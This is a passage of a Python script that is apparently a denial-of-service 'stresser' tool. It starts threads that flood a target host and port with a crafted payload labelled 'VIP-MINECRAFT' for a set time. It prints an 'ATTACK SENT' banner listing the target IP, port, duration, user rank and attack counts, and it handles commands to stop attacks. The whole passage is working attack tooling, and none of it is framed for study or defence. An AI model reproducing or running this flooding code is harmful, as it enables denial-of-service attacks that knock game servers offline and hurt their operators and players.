						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""
\u001b[31m╔═════════════════════════════════════════════════════════╗
║ \u001b[31m             ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗           ║          
║ \u001b[31m             ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║            ║          
║ \u001b[31m             ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩            ║    
╚═════════════════════════════════════════════════════════╝
\t\t[ # ]========================[ # ]\n\n
\t\t[ $ ]\033[1;32;40m IP TARGET   : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIME        : {}\033[1;33,40m
\t\t[ $ ]\033[1;32;40m METHOD      : [VIP-MINECRAFT]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m USERNAME    : [Waffle]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m RANK        : [KING]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m ALL ATTACKS : [23]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m MAX TIME    : [400]\033[1;33,40m
\t\t[ $ ]\033[1;32;40m CONCURRENTS : [0]\033[1;33,40m
\t\t[ # ]========================[ # ]\033[0m """.format(host, port, timer, method))
			except ValueError:
				main()                
                
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()
if __name__ == "__main__":
    os.system("cls")
    print(banner)
    main()
